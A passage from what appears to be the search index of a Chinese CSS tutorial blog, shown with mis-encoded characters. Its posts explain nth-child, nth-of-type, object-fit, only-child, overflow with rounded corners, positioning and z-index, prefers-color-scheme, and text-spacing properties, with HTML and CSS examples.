.bg-redã€ï¼Œä½†æ˜¯ä¸æ˜¯é€™æ¨£ã€‚ å…¶å¯¦æ­£ç¢ºçš„é †åºæ˜¯ã€Œå…ˆé¸åˆ° .wrapper åº•ä¸‹çš„ nth-child(even) å…ƒç´ ã€ï¼Œæ¥è‘—æ‰å¾é€™è£¡é¢æ‰¾å‡ºæœ‰ .bg-red class çš„å…ƒç´ ã€‚ æ‹¿å‰›å‰›çš„ä¾‹å­ä¾†èªªå°±æ˜¯ï¼š 123456&lt;div class=\"wrapper\"&gt; &lt;div class=\"bg-red\"&gt;nth-child(1)&lt;/div&gt; &lt;div&gt;nth-childn(2)&lt;/div&gt; &lt;div class=\"bg-red\"&gt;nth-child(3)&lt;/div&gt; &lt;div&gt;nth-child(4)&lt;/div&gt;&lt;div&gt;row5&lt;/div&gt; nth-child(2) çš„ div ä¸¦æ²’æœ‰ .bg-red çš„ classï¼Œæ‰€ä»¥ä¸æœƒè¢«é¸åˆ°ï¼Œè€Œç¬¬äºŒå€‹ .bg-red å¯¦éš›ä¸Šæ˜¯ nth-child(3)ï¼Œæ‰€ä»¥ä¹Ÿä¸æœƒè¢«é¸åˆ°ã€‚ å› æ­¤åœ¨çœ‹é€™ç¨® selector çš„æ™‚å€™ï¼Œå»ºè­° ã€Œå¾å¾Œé¢å¾€å‰çœ‹ã€ï¼Œå…ˆçœ‹å¾Œé¢çš„ nth-childï¼Œåœ¨çœ‹å‰é¢çš„ class åç¨±ï¼Œæœƒæ¯”è¼ƒå¥½ç†è§£ä¸€é»ã€‚ nth-child(an+b)æŠŠ n æƒ³æˆæ˜¯ä½ åœ¨å¯«è¿´åœˆçš„é‚£å€‹ iï¼Œå®ƒæœƒå¾ 0, 1, 2, â€¦ ä¸€ç›´è·‘ã€‚å¦å¤– a è·Ÿ b æ˜¯ä¸€å€‹å¸¸æ•¸ï¼Œä¸å¡«çš„è©±é è¨­ç‚º 0ã€‚ æ‰€ä»¥å¯ä»¥é€™æ¨£ç”¨ï¼š 12345678910111213.wrapper div:nth-child(0n+3) =&gt; é¸åˆ°ç¬¬ 3 å€‹ div.wrapper div:nth-child(2n+1) =&gt; é¸åˆ°ç¬¬ 1 3 5 7 ... å€‹ div.wrapper div:nth-child(2n) =&gt; é¸åˆ°ç¬¬ 0 2 4 6 ... å€‹ div.wrapper div:nth-child(3n) =&gt; é¸åˆ°ç¬¬ 0 3 6 9 ... å€‹ div.wrapper div:nth-child(-1n+9) =&gt; é¸åˆ°ç¬¬ 9 8 7 ... å€‹ div.wrapper div:nth-child(4n-2) =&gt; é¸åˆ°ç¬¬ -2 2 4 6 ... å€‹ div.wrapper div:nth-child(3n+1) =&gt; é¸åˆ°ç¬¬ 1 4 7 ... å€‹ div","link":"/2022/01/13/css-nth-child/"},{"title":"CSS nth-of-type","text":"ä¼¼æ›¾ç›¸ä¼¼ï¼Ÿ æ¯” nth-child æ›´åš´è¬¹ä¸€é»é€™å€‹è·Ÿ :nth-child() å·®ä¸å¤šï¼Œå·®åˆ¥åœ¨æ–¼å®ƒæœƒã€ŒæŒ‰ç…§æ¨™ç±¤ä¾†åˆ†çµ„ã€ï¼š 123456789&lt;div class=\"wrapper\"&gt; &lt;div&gt;div1&lt;/div&gt; &lt;p&gt;p1&lt;/p&gt; &lt;p&gt;p2&lt;/p&gt; &lt;div&gt;div2&lt;/div&gt; &lt;p&gt;p3&lt;/p&gt; &lt;p&gt;p4&lt;/p&gt; &lt;div&gt;div3&lt;/div&gt;&lt;/div&gt; å¦‚æœæƒ³å°ç¬¬å¥‡æ•¸å€‹ &lt;p&gt; åšè¨­å®šï¼š 123.wrapper p:nth-of-type(odd) { background-color: orange;} è¼•è¼•é¬†é¬†æå®šï¼ å¸¸çŠ¯çš„éŒ¯èª¤ä½†å¦‚æœé€™æ™‚å€™ä½ æ”¹ç”¨ nth-child()ï¼Œçµæœæœƒè·Ÿä½ æƒ³çš„ä¸å¤ªä¸€æ¨£ï¼š 123.wrapper p:nth-child(odd) { background-color: orange;} çµæœï¼š é€™æ˜¯å› ç‚º nth-child æœƒä»¥ã€ŒåŒéšå±¤ã€çš„å…ƒç´ ä¾†åšæ’åºï¼Œåƒé€™æ¨£ï¼š 123456789&lt;div class=\"wrapper\"&gt; &lt;div&gt;1&lt;/div&gt; &lt;p&gt;2&lt;/p&gt; &lt;p&gt;3&lt;/p&gt; &lt;div&gt;4&lt;/div&gt; &lt;p&gt;5&lt;/p&gt; &lt;p&gt;6&lt;/p&gt; &lt;div&gt;7&lt;/div&gt;&lt;/div&gt; æ‰€ä»¥å¯¦éš›ä¸Šæœƒå…ˆé¸åˆ°ç¬¬å¥‡æ•¸å€‹å…ƒç´ ï¼Œæ¥è‘—æ‰çœ‹æ˜¯ä¸æ˜¯ &lt;p&gt;ã€‚ï¼ˆå¯ä»¥åƒè€ƒ é€™è£¡ çš„è§£é‡‹ï¼‰ è‡³æ–¼ nth-of-type() å¯ä»¥åƒæˆæ˜¯é€™æ¨£ï¼š 12345678910111213&lt;div class=\"wrapper\"&gt; &lt;div&gt;1&lt;/div&gt; &lt;p&gt;1&lt;/p&gt; &lt;p&gt;2&lt;/p&gt; &lt;div&gt;2&lt;/div&gt; &lt;p&gt;3&lt;/p&gt; &lt;p&gt;4&lt;/p&gt; &lt;div&gt;3&lt;/div&gt;&lt;/div&gt; æ‰€ä»¥ä¸€å®šè¦ææ¸…æ¥šå®ƒå€‘å…©å€‹çš„å·®åˆ¥ã€‚","link":"/2022/01/13/css-nth-of-type/"},{"title":"è®“ä½ ä¸å†ç…©æƒ±åœ–ç‰‡å°ºå¯¸å•é¡Œï¼Œobject-fit èˆ‡ object-position","text":"çœŸçš„å¾ˆå¥½ç”¨ã€‚ ç°¡è¿°å…©è€…éƒ½æ˜¯åœ¨ CSS3 å®šç¾©çš„æ–°å±¬æ€§ï¼Œé™¤äº† IE ä»¥å¤–å¤§éƒ¨åˆ†ç€è¦½å™¨éƒ½æœ‰æ”¯æ´ï¼š é€™å…©å€‹å±¬æ€§ç”¨ä¾†è¨­å®šã€Œç½®æ›å…ƒç´ ï¼ˆreplaced-elementï¼‰ã€ä¸­çš„å…§å®¹çš„å¡«æ»¿æ–¹å¼ã€‚ ğŸ’¡ è¨» 1ï¼šç½®æ›å…ƒç´ ç°¡å–®ä¾†èªªå°±æ˜¯å¯ä»¥è¨­å®šwidthèˆ‡heightçš„ inline-level å…ƒç´ ï¼Œä¾‹å¦‚ï¼š&lt;img&gt;ğŸ’¡ è¨» 2ï¼šé€™å€‹ç½®æ›å…ƒç´ æœ¬èº«å¿…é ˆè¦æœ‰æ˜ç¢ºçš„å¯¬è·Ÿé«˜ï¼Œæ›å¥è©±èªªå°±æ˜¯å¿…é ˆæœ‰è¨­ç½®widthèˆ‡heightæ‰è¡Œã€‚ å…¶å¯¦ä½ ä¹Ÿå¯ä»¥æŠŠé€™å…©å€‹å±¬æ€§ç•¶ä½œæ˜¯ç¿»ç‰ˆçš„background-sizeå’Œbackground-positionï¼Œæ¦‚å¿µå·®ä¸å¤šã€‚ ä½¿ç”¨æ–¹å¼æˆ‘å€‘ç›´æ¥ä¾†çœ‹æ€éº¼ä½¿ç”¨å§ï¼š 123456&lt;div class=\"box\"&gt; &lt;h2 class=\"title\"&gt;picture&lt;/h2&gt; &lt;div class=\"item\"&gt; &lt;img class=\"pic\" src=\"image.jpg\" /&gt; &lt;/div&gt;&lt;/div&gt; 1234.pic { width: 250px; height: 500px;} åœ¨æˆ‘å€‘å°&lt;img&gt;è¨­å®šå¯¬é«˜æ™‚ï¼Œåœ–ç‰‡æœƒç›´æ¥æŒ‰ç…§æˆ‘å€‘è¨­å®šçš„å¯¬é«˜ä¾†å‘ˆç¾ï¼š ä½†å¦‚ä½ æ‰€è¦‹ï¼Œåœ–ç‰‡çš„æ¯”ä¾‹æœƒè·‘æ‰ï¼Œå¾ˆä¸å¥½çœ‹ã€‚ é€™æ™‚å€™åªè¦åŠ ä¸Š object-fit å°±å¯ä»¥è§£æ±ºé€™å€‹å•é¡Œï¼š 12345.pic { width: 250px; height: 500px; object-fit: cover;} object-fitå¯ä»¥è¨­å®šçš„å€¼æœ‰é€™äº›ï¼š ğŸš€ Codepenï¼šé»é€™è£¡ è£œå……ï¼š fill é è¨­å€¼ï¼Œä»£è¡¨ç›´æ¥å¥—ç”¨è¨­å®šçš„å¯¬é«˜ã€‚ none é¡¯ç¤ºåŸå§‹å°ºå¯¸ã€‚ scale-down æœƒå¾ none è·Ÿ contain è£¡é¢æŒ‘å°ºå¯¸æ¯”è¼ƒå°çš„ä¾†å¥—ç”¨ã€‚ cover contain è·Ÿ background-size çš„æ¦‚å¿µä¸€æ¨£ã€‚ è‡³æ–¼ object-position å‰‡æ˜¯ç”¨ä¾†ã€Œèª¿æ•´ä½ç½®ã€ï¼Œè·Ÿ background-size çš„æ¦‚å¿µ 87 åˆ†åƒï¼Œé€™è£¡å°±ä¸å†èˆ‰ä¾‹ï¼Œè«‹å„ä½è‡ªå·±ç©ç©çœ‹ï¼Œæˆ–æ˜¯ç›´æ¥åƒè€ƒ MDN ä¸­çš„ç¯„ä¾‹ã€‚","link":"/2022/01/16/css-object-fit-and-object-position/"},{"title":"CSS only-child","text":"ç¬¬ä¸€æ¬¡ç¢°åˆ°ä½¿ç”¨å®ƒçš„æƒ…æ³ã€‚ ç°¡è¿°åœ¨å¹« highlight.js è¨­å®š line-number çš„æ¨£å¼æ™‚ï¼Œç¢°åˆ°äº†ä¸€å€‹å•é¡Œã€‚ é¦–å…ˆç¨‹å¼ç¢¼å€å¡Šçš„ HTML å¤§æ¦‚é•·é€™æ¨£ï¼š 1234567&lt;tabel&gt; &lt;tbody&gt; &lt;tr&gt;ç¬¬ 1 è¡Œç¨‹å¼ç¢¼&lt;/tr&gt; &lt;tr&gt;ç¬¬ 2 è¡Œç¨‹å¼ç¢¼&lt;/tr&gt; &lt;tr&gt;ç¬¬ 3 è¡Œç¨‹å¼ç¢¼&lt;/tr&gt; &lt;/tbody&gt;&lt;/tabel&gt; ç‚ºäº†è®“ä¸Šä¸‹æ–¹æœ‰ä¸€é» paddingï¼Œæˆ‘åšäº†é€™æ¨£çš„ CSS è¨­å®šï¼š 123456789101112131415/* ç¬¬ä¸€è¡Œçš„ number ä¸Šæ–¹åŠ  padding */.hljs-ln tr:first-child .hljs-ln-numbers { padding-top: 0.8em !important;}/* æœ€å¾Œä¸€è¡Œçš„ number ä¸‹æ–¹åŠ  padding */.hljs-ln tr:last-child .hljs-ln-numbers { padding-bottom: 0.8em !important;}/* ç‚ºäº†è®“ç¬¬ä¸€è·Ÿæœ€å¾Œä¸€è¡Œ code å°é½Šï¼Œè¨­å®š vertical-align */.hljs-ln tr:first-child .hljs-ln-code { vertical-align: bottom;}.hljs-ln tr:last-child .hljs-ln-code { vertical-align: top;} å‡ºä¾†çš„çµæœå¦‚ä¸‹ï¼š ä½†æ˜¯ç•¶åªæœ‰ä¸€è¡Œç¨‹å¼ç¢¼çš„æ™‚å€™æœƒæœ‰å•é¡Œï¼š å› ç‚ºåªæœ‰ä¸€è¡Œçš„æ™‚å€™æœƒåŒæ™‚ç¬¦åˆ :first-child è·Ÿ :last-childï¼Œé€™æ™‚å€™å°±æœƒå¥—ç”¨åœ¨å¾Œé¢çš„é‚£å€‹ï¼Œæ‰€ä»¥æ˜¯ vertical-align: topã€‚ é€™æ™‚å€™è©²æ€éº¼è™•ç†ï¼Ÿå°±ç”¨ only-child ä¾†è§£æ±ºï¼åªè¦åŠ ä¸Šé€™ä¸€è¡Œå°±å®Œç¾æå®šï¼š 123.hljs-ln tr:only-child .hljs-ln-code{ vertical-align: middle;} ç°¡å–®ä¾†èªªï¼Œonly-child æœƒé¸åˆ°æ²’æœ‰å…„å¼Ÿå…ƒç´ çš„å…ƒç´ ã€‚ä¸Šé¢çš„ tr æ­£å¥½å°±ç¬¦åˆé€™å€‹æ¢ä»¶ï¼Œæ‰€ä»¥æ‰èƒ½é¸åˆ°ã€‚","link":"/2022/02/20/css-only-child/"},{"title":"CSS ä¹‹æˆ‘çš„åœ–ç‰‡æœ‰ç¸«ï¼","text":"ç¤™çœ¼å•¦ï¼ å•é¡Œé»é€šå¸¸æˆ‘å€‘æœƒæŠŠåœ–ç‰‡æ”¾åœ¨ä¸€å€‹ç›’å­è£¡ï¼Œåƒé€™æ¨£ï¼š 123&lt;div class=\"wrapper\"&gt; &lt;img src=\"https://process.fs.teachablecdn.com/ADNupMnWyR7kCWRvm76Laz/resize=width:705/https://www.filepicker.io/api/file/9n6ZlBe3SbmlkuX2f2su\"&gt;&lt;/div&gt; ä½†é€™æ™‚å€™æœƒç™¼ç¾ä¸‹é¢å¤šäº†ä¸€æ¢ã€Œç¸«ã€ï¼š é€™æ˜¯å› ç‚º &lt;img&gt; æ˜¯ã€Œinline-levelã€çš„å…ƒç´ ã€‚ æœ‰å€‹å« vertical-align çš„å±¬æ€§æ˜¯ç”¨å°ˆé–€ç”¨ä¾†è¨­å®š inline å…ƒç´ çš„å°é½Šæ–¹å¼ã€‚å› ç‚ºå®ƒçš„é è¨­å€¼æ˜¯ baselineï¼Œæ‰€ä»¥æ‰æœƒå¤šäº†é‚£æ¢ç¸«ï¼Œåªè¦æŠŠå®ƒæ”¹æˆ middle æˆ– bottom å°±å¯ä»¥è§£æ±ºäº†ï¼š 123img { vertical-align: middle;} çµæœï¼š æˆ–å…¶å¯¦ä¹Ÿæœ‰å¦å¤–ä¸€ç¨®ä½œæ³•ï¼Œå°±æ˜¯æŠŠ &lt;img&gt; è¨­æˆ inline ä»¥å¤–çš„å…ƒç´ ä¹Ÿå¯ä»¥ã€‚","link":"/2022/01/13/css-picture-problem/"},{"title":"CSS ä¸­çš„ overflow èˆ‡åœ“è§’çš„é—œä¿‚","text":"é€šå¸¸æ˜¯æ»¿ç‰ˆç•«é¢æ‰æœƒè¸©åˆ°é€™å€‹é›·ã€‚ ç´€éŒ„overflow å¯ä»¥è¨­å®šçš„å€¼æœ‰ï¼š visible (é è¨­å€¼) clip auto hidden scroll inherit overflow æœ‰ä¸€å€‹ç”¨é€”æ˜¯æ‹¿ä¾†èˆ‡ border-radius çµåˆä¾†è£½ä½œåœ“è§’æ•ˆæœã€‚ å¦‚æœä¸€å€‹å®¹å™¨å…ƒç´ ä¸­çš„å­å…ƒç´ æ˜¯ 100%å¡«æ»¿å®¹å™¨çš„è©±ï¼Œå–®å–®åœ¨å®¹å™¨å…ƒç´ ä¸­è¨­å®š border-radius æ˜¯çœ‹ä¸å‡ºæ•ˆæœçš„ï¼Œä½ æœƒçœ‹åˆ°å­å…ƒç´ çš„éƒ¨åˆ†æœƒå‡¸å‡ºå»å®¹å™¨å¤–é¢ã€‚ é€™æ˜¯å› ç‚º border-radius æœ¬èº«ä¸¦ä¸æœƒæ”¹è®Šå®¹å™¨çš„å¯¬åº¦ï¼Œä¸¦ä¸” overflow çš„é è¨­å€¼ç‚ºvisibleï¼Œæ‰€ä»¥ç‚ºäº†èƒ½å¤ æ­£ç¢ºçš„é¡¯ç¤ºåœ“è§’ï¼Œä½ é‚„å¾—å†å° overflow é€™å€‹å±¬æ€§åšèª¿æ•´ã€‚ å…¶å¯¦æˆ‘ä¸€ç›´ä»¥ç‚ºoverflow: hiddenæ˜¯æœ€æ­£ç¢ºçš„ä½œæ³•ï¼Œå› ç‚ºé€™æ˜¯ä¸€å€‹å¾ˆç›´è¦ºçš„æƒ³æ³•ï¼Œå°±éš±è—èµ·ä¾†å˜›ï¼æ‰€ä»¥ç•¶ç„¶è¦è¨­æˆ hidden ä¸æ˜¯å—ï¼Ÿ å¤§éƒ¨åˆ†çš„æƒ…æ³ä¸‹é€™æ˜¯æ­£ç¢ºçš„ï¼Œä¸éå¦‚æœæœ‰ä¸€å¤©å®¹å™¨çš„é«˜åº¦å¯èƒ½æœƒè¢«å£“ç¸®åˆ°å¾ˆå°çš„æƒ…æ³ç™¼ç”Ÿæ™‚ï¼Œä½ å°±æœƒç™¼ç¾é€™æ¨£åšæœƒæœ‰å€‹å•é¡Œï¼š å…§å®¹å±…ç„¶è¢«è…°æ–¬äº†ï¼ æ˜¯çš„ï¼Œå› ç‚ºé€™å°±æ˜¯overflow:hiddençš„ä½œç”¨ï¼Œåªè¦è¶…å‡ºå®¹å™¨ç¯„åœçš„æ‰€æœ‰æ±è¥¿éƒ½æœƒè¢«éš±è—èµ·ä¾†ã€‚ æ‰€ä»¥ç•¶æˆ‘ç™¼ç¾é€™å€‹å•é¡Œå¾Œï¼Œæˆ‘ä¸Šç¶²åšäº†ä¸€äº›ç ”ç©¶ï¼Œæ‰ç™¼ç¾å¦å¤–ä¸€ä»¶äº‹ï¼š å¦‚æœæƒ³è¦å°‡æº¢å‡ºå®¹å™¨çš„ç¯„åœçµ¦éš±è—èµ·ä¾†ï¼Œå…¶å¯¦ä¸¦ä¸æ˜¯åªæœ‰overflow:hiddené€™å€‹åšæ³•ï¼Œè€Œæ˜¯ï¼š åªè¦æŠŠ overflow è¨­ç‚º visible ä»¥å¤–çš„å€¼å³å¯ã€‚ åŸç†ï¼šåªæœ‰ visible é€™å€‹å€¼ä¸æœƒå°å®¹å™¨åšè£åˆ‡ ç¤ºç¯„123&lt;div class=\"box\"&gt; &lt;div class=\"box__inner\"&gt;&lt;/div&gt;&lt;/div&gt; 12345678910111213141516171819202122232425262728293031html, body { /* è¨­å®šç‚ºè·Ÿè¦–çª—ä¸€æ¨£çš„é«˜ï¼ˆå…¨å±ï¼‰ */ height: 100%; box-sizing: border-box; padding: 40px 0;}.box { /* è·Ÿ body ä¸€æ¨£é«˜ï¼Œæ‰€ä»¥ç•¶è¦–çª—ç¸®å°æ™‚ï¼Œ box çš„é«˜åº¦ä¹Ÿæœƒè·Ÿè‘—ç¸®å° */ width: 500px; height: 100%; margin: auto; border-radius: 30px; box-sizing: border-box; background-color: black; /* å¦‚æœæ˜¯ hiddenï¼ŒæŠŠè¦–çª—çš„é«˜ç¸®å°æ™‚ box æœƒè¢«è…°æ–¬ï¼Œ å¦‚æœæ˜¯ autoï¼Œbox è£¡é¢å°±æœƒç”¢ç”Ÿæ»¾è»¸ï¼Œä¸æœƒè¢«è…°æ–¬ã€‚ */ overflow: hidden; overflow: auto;}.box__inner { width: 100%; height: 400px; background-color: orange;} overflow: hiddenï¼š overflow: autoï¼š","link":"/2022/01/16/css-overflow-problem/"},{"title":"CSS ä¸­çš„å®šä½ï¼ˆpositionï¼‰","text":"ç¶“å…¸çš„å®šä½å±¬æ€§ã€‚ staticç€è¦½å™¨é è¨­çš„å®šä½æ–¹å¼ï¼Œè©²æ”¾åœ¨å“ªå°±æ”¾åœ¨å“ªï¼š 123&lt;div class=\"box\"&gt;box1&lt;/div&gt;&lt;div class=\"box\"&gt;box2&lt;/div&gt;&lt;div class=\"box\"&gt;box3&lt;/div&gt; 123456.box { width: 100px; height: 100px; margin: 10px 0; background: orange;} çµæœï¼š relativeæ ¹æ“šåŸæœ¬ï¼ˆstaticï¼‰çš„ä½ç½®ä¾†åšåç§»ï¼Œè¦æ³¨æ„çš„æ˜¯ä¸æœƒå½±éŸ¿åˆ°æ—é‚Šçš„å…ƒç´ ã€‚ HTMLï¼š 123&lt;div class=\"box\"&gt;box1&lt;/div&gt;&lt;div class=\"box\"&gt;box2&lt;/div&gt;&lt;div class=\"box\"&gt;box3&lt;/div&gt; CSSï¼š 1234567891011.box { width: 100px; height: 100px; margin: 10px 0; background: orange;}.box:nth-child(2) { position: relative; left: 120px; top: 50px;} çµæœï¼š absoluteé‡å°æŸå€‹åƒè€ƒé»ä¾†å®šä½ã€‚å°±åƒ relative æ˜¯é‡å°åŸæœ¬ï¼ˆstaticï¼‰çš„ä½ç½®ä¾†å®šä½ä¸€æ¨£ï¼Œabsoulte æ˜¯è®“ä½ å¯ä»¥è‡ªå·±æŒ‡å®šè¦åƒè€ƒé»ã€‚ è‡³æ–¼åƒè€ƒé»çš„æ©Ÿåˆ¶æ˜¯ï¼šå¾€ä¸Šæ‰¾ä¸æ˜¯ static çš„å…ƒç´ ï¼Œå¦‚æœéƒ½æ‰¾ä¸åˆ°å°±æŠŠã€Œè¦–çª—ï¼ˆviewportï¼‰ã€ç•¶åƒè€ƒé»ã€‚ å‚™è¨»ï¼šè¦æ³¨æ„æ—é‚Šçš„å…ƒç´ æœƒè‡ªå‹•éè£œç©ºé–“ã€‚ ä¸‹é¢è®“ box-inner ä»¥ box:nth-child(2) ä¾†åšå®šä½ï¼š 123456789&lt;div class=\"box\"&gt;box1&lt;/div&gt;&lt;div class=\"box\"&gt; box-2 &lt;div class=\"box-inner\"&gt;X&lt;/div&gt;&lt;/div&gt;&lt;div class=\"box\"&gt;box3&lt;/div&gt;&lt;div class=\"box\"&gt;box4&lt;/div&gt;&lt;div class=\"box\"&gt;box5&lt;/div&gt;&lt;div class=\"box\"&gt;box6&lt;/div&gt; CSSï¼š 123456789.box:nth-child(2) { position: relative;}.box-inner { position: absolute; top: 0; right: 0; background: red;} çµæœï¼š å¦‚æœæ²’æœ‰è¨­å®šåƒè€ƒé»çš„è©±å°±æœƒå®šä½åˆ°è¦–çª—ï¼ˆviewportï¼‰ï¼š 123456.box-inner { position: absolute; top: 0; right: 0; background: red;} çµæœï¼š å‚™è¨»ï¼šå¦‚æœä½ ä¸ä¿¡çš„è©±ï¼Œè©¦è‘—æŠŠ &lt;html&gt; è·Ÿ &lt;body&gt; éƒ½è¨­æˆå›ºå®šå¯¬é«˜ï¼Œå°±æœƒç™¼ç¾å…ƒç´ çš„ä½ç½®éš¨è‘—ä¸æœƒæ”¹è®Šï¼Œé€™å°±è­‰æ˜åƒè€ƒé»ä¸æ˜¯å®ƒå€‘ã€‚ fixedæ ¹æ“šè¦–çª—ï¼ˆviewportï¼‰çš„ä½ç½®ä¾†å®šä½ï¼Œç‰¹æ€§æ˜¯ä¸ç®¡æ€éº¼æ²å‹•éƒ½æœƒåœ¨åŸæœ¬çš„ä½ç½®ã€‚ å‚™è¨»ï¼šè¦æ³¨æ„æ—é‚Šçš„å…ƒç´ æœƒè‡ªå‹•éè£œç©ºé–“ã€‚ 123456&lt;div class=\"box\"&gt;box1&lt;/div&gt;&lt;div class=\"box\"&gt;box2&lt;/div&gt;&lt;div class=\"box\"&gt;box3&lt;/div&gt;&lt;div class=\"box\"&gt;box4&lt;/div&gt;&lt;div class=\"box\"&gt;box5&lt;/div&gt;&lt;div class=\"box\"&gt;box6&lt;/div&gt; CSSï¼š 12345678.box:nth-child(2) { position: fixed; width: 100px; height: 100px; right: 100px; bottom: 100px; background-color: red;} çµæœï¼š stickyåœ¨ç¢°åˆ° top çš„é»ä¹‹å‰æ˜¯ staticï¼Œç¢°åˆ°ä¹‹å¾Œå°±é»ä½ï¼ˆå¾ˆåƒ fixed çš„æ„Ÿè¦ºï¼‰ï¼š å‚™è¨»ï¼šæ­¤è™•çš„åƒè€ƒé»æ˜¯è¦–çª—ï¼ˆviewportï¼‰ CSSï¼š 12345.box:nth-child(2) { position: sticky; top: 10px; background-color: red;} çµæœï¼š z-indexç”¨ä¾†è¨­å®šåœ–å±¤çš„ä½ç½®ï¼Œèˆ‰ä¾‹ä¾†èªªï¼š 12345678&lt;body&gt; &lt;div class=\"box\"&gt;box1&lt;/div&gt; &lt;div class=\"box\"&gt;box2&lt;/div&gt; &lt;div class=\"box\"&gt;box3&lt;/div&gt; &lt;div class=\"box\"&gt;box4&lt;/div&gt; &lt;div class=\"box\"&gt;box5&lt;/div&gt; &lt;div class=\"box\"&gt;box6&lt;/div&gt;&lt;/body&gt; CSSï¼š 12345678910111213.box { background: orange; width: 300px; height: 200px; margin: 10px 0px; font-size: 2em; text-align: center; position: relative;}.box:nth-child(2) { top: -100px; background-color: red;} çµæœï¼š CSSï¼š 12345678910111213.box { background: orange; width: 300px; height: 200px; margin: 10px 0px; font-size: 2em; text-align: center; position: relative;}.box:nth-child(2) { top: 100px; background-color: red;} çµæœï¼š åŒæ¨£éƒ½æ˜¯è¦†è“‹ï¼Œä½†åœ¨å¾Œé¢çš„æœƒè“‹æ‰å‰é¢çš„ï¼Œå¦‚æœä¸æƒ³è¢«è“‹å‘¢ï¼ŸåŠ ä¸Š z-index CSSï¼š 1234567891011121314.box { background: orange; width: 300px; height: 200px; margin: 10px 0px; font-size: 2em; text-align: center; position: relative;}.box:nth-child(2) { top: 100px; background-color: red; z-index: 1;} çµæœï¼š","link":"/2022/01/12/css-position/"},{"title":"è®“ç¶²é è®Šå¾—æ›´æ½®ï¼Œprefers-color-scheme","text":"æ½®æ½®æ½®ã€‚ ä½¿ç”¨æ–¹æ³•é€™å€‹æ±è¥¿å¥½åƒæœ‰é»é‚Šç·£ï¼Œæ‰€ä»¥æƒ³è·Ÿå¤§å®¶åˆ†äº«ä¸€ä¸‹ï¼šprefers-color-scheme å®ƒæ˜¯ meida query ä¸­çš„ä¸€å€‹ç‰¹å¾µåŠŸèƒ½ï¼Œå°±è·Ÿ (max-width: 666px) æ˜¯ä¸€æ¨£çš„æ±è¥¿ã€‚ è®“æˆ‘å€‘çœ‹ä¸€ä¸‹ MDN çš„å®šç¾©å§ï¼š The prefers-color-scheme CSS media feature is used to detect if the user has requested a light or dark color theme. ç°¡å–®ä¾†èªªï¼Œprefers-color-scheme æ˜¯ç”¨ä¾†åµæ¸¬ä½¿ç”¨è€…æ˜¯å¦æœ‰ä½¿ç”¨ã€Œæ·ºè‰²ã€æˆ–ã€Œæ·±è‰²ã€çš„ä¸»é¡Œã€‚ ç•¶ä½¿ç”¨è€…è¨­å®šçš„ä¸»é¡Œæ˜¯æ·ºè‰²æ™‚ï¼Œæœƒè¢« @media (prefers-color-scheme: light) çµ¦åµæ¸¬åˆ°ï¼Œåä¹‹ï¼Œç•¶ä¸»é¡Œæ˜¯æ·±è‰²æ™‚ï¼Œæœƒè¢« @media (prefers-color-scheme: dark) çµ¦åµæ¸¬åˆ°ã€‚ è€Œå®ƒçš„åµæ¸¬ä¾†æºæ˜¯ä½œæ¥­ç³»çµ±ä¸­çš„è¨­å®šï¼š æ‰€ä»¥ç›´æ¥è®“æˆ‘å€‘ä¾†çœ‹å€‹ç¤ºç¯„ï¼š 12345678&lt;div class=\"box\"&gt; &lt;p class=\"txt\"&gt; é€™å€‹å€å¡Šæœƒæ ¹æ“šä½ åœ¨ä½œæ¥­ç³»çµ±ä¸­çš„ä¸»é¡Œè¨­ç½®ä¾†è®Šæ›´æˆæ·±è‰² / æ·ºè‰²ä¸»é¡Œã€‚ &lt;/p&gt; &lt;p class=\"txt\"&gt; ç¾åœ¨ä½ æ­£åœ¨ä½¿ç”¨çš„æ˜¯ &lt;span class=\"userThemeCheck\"&gt;&lt;/span&gt; ä¸»é¡Œã€‚ &lt;/p&gt;&lt;/div&gt; 12345678910111213141516171819202122232425.box { // â†“ æ·ºè‰²ä¸»é¡Œè¨­å®šï¼ˆç™½åº•é»‘å­—ï¼‰ background-color: $primary-white; color: $black;}.userThemeCheck::after { // â†“ æ·ºè‰²ä¸»é¡Œé¡¯ç¤ºæ–‡å­— content: 'æ·ºè‰²'; // â†“ ç¶ è‰²æ–‡å­— color: $green;}// â†“ æ·±è‰²ä¸»é¡Œè¨­å®šï¼ˆé»‘åº•ç™½å­—ï¼‰@media (prefers-color-scheme: dark) { .box { background-color: $black; color: $white; } .userThemeCheck::after { content: 'æ·±è‰²'; // â†“ é»ƒè‰²æ–‡å­— color: $yellow; }} ğŸš€ Codepenï¼šé»é€™è£¡","link":"/2022/01/16/css-prefers-color-scheme/"},{"title":"CSS ä¸€äº›ä¹…äº†å¯èƒ½æœƒå¿˜è¨˜çš„å±¬æ€§","text":"å¦‚é¡Œï¼Œæ‰€ä»¥é–‹ä¸€ç¯‡ä¾†åšå½™æ•´ï¼Œè¦æŸ¥çš„æ™‚å€™æ¯”è¼ƒæ–¹ä¾¿ã€‚ æ–‡å­—ç›¸é—œwhite-space æ±ºå®šã€Œç©ºç™½ã€è·Ÿã€Œæ›è¡Œã€çš„æ¨£å¼ã€‚ 123456789101112.box { /* æ›è¡Œè·Ÿç©ºæ ¼éƒ½åªé¡¯ç¤ºç‚ºä¸€å€‹ç©ºæ ¼ï¼ˆé è¨­ï¼‰ */ white-space: normal; /* ä¸æ›è¡Œ */ white-space: nowrap; /* ä¿ç•™åŸæœ¬åœ¨ç·¨è¼¯å™¨çš„æ ¼å¼ */ white-space: pre; /* ä¿ç•™æ›è¡Œæ ¼å¼ï¼Œä½†ç©ºæ ¼åªæœƒç•¶ä½œä¸€å€‹ */ white-space: pre-line; /* è·Ÿ pre ä¸€æ¨£ï¼Œä½†è¶…å‡ºç¯„åœçš„æ™‚å€™æœƒæ›è¡Œ */ white-space: pre-wrap;} word-spacing è¨­å®šã€Œå–®å­—ï¼ˆç©ºæ ¼ï¼‰ã€ä¹‹é–“çš„é–“éš”ï¼š 123456.box { /* é è¨­å€¼ */ word-spacing: normal; /* è¨­å®šå–®ä½ */ word-spacing: 1em; } letter-spacing è¨­å®šã€Œæ¯ä¸€å€‹å­—ã€çš„é–“éš”ï¼š 12345.box { /* é è¨­å€¼ */ letter-spacing: normal; letter-spacing: 1px;} word-break è¨­å®šæ–‡å­—çš„æ›è¡Œè¦å‰‡ã€‚ è©³ç´°ä»‹ç´¹å¯ä»¥åƒè€ƒï¼šCSS ä¹‹æˆ‘çš„æ–‡å­—å¤ªé•·å•¦ 12345678.box { /* ä¾ç…§ç©ºæ ¼æˆ–æ›è¡Œä¾†æ–·è¡Œï¼ˆé è¨­ï¼‰ */ word-break: normal; /* è¶…å‡ºå¯¬åº¦ç¯„åœå°±æ–·è¡Œ */ word-break: break-all; /* ä¾ç…§å–®å­—ä¾†æ–·è¡Œ */ word-break: 